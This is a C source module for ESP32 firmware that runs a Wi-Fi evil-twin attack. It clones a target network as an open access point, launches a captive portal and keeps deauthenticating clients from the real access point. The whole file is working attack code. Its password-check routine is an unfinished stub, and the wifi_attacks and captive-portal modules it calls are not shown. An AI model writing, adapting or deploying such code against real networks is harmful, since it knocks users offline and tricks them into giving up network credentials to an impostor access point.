#include <string.h>
#include "esp_log.h"
#include "esp_task_wdt.h"
#include "wifiMng.h"
#include "admin_server.h"
#include "server.h"
#include "evil_twin.h"
#include "wifi_attacks.h"


/* Store target information */
static const char *TAG = "EVIL_TWIN:";
static target_info_t target = { 0 };
static TaskHandle_t evil_twin_task_handle = NULL;


void evil_twin_set_target(target_info_t *targe_info)
{
    memcpy(&target, targe_info, sizeof(target_info_t));
}


static void evil_twin_task(void *pvParameters) 
{
    vTaskDelay(pdMS_TO_TICKS(500));

    /* Stop admin server TODO: Verificare se possibile lasciarlo attivo se non usa troppa ram */
    http_admin_server_stop();

    /* Get target information */
    /*Try guess by ssid */
    target.vendor = getVendor((uint8_t *)&target.ssid);

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = target.channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&target.ssid);
    wifi_ap_clone(&wifi_config);

    /* Wait AP to be cloned */
    vTaskDelay(pdMS_TO_TICKS(5000));

    /* Start captive portal server */
    http_attack_server_start();

    /* Start wifi attack engine */
    wifi_attack_engine_start(target.bssid);

    while(true)
    {
        wifi_attack_deauth(target.bssid);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}


void evil_twin_start_attack(void)
{
    if( evil_twin_task_handle != NULL )
    {   
        ESP_LOGE(TAG, "EvilTwin task already started.");
        return;
    }

    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 5, &evil_twin_task_handle);
}


esp_err_t evil_twin_check_password(char *password)
{
    //TODO
    return ESP_OK;
}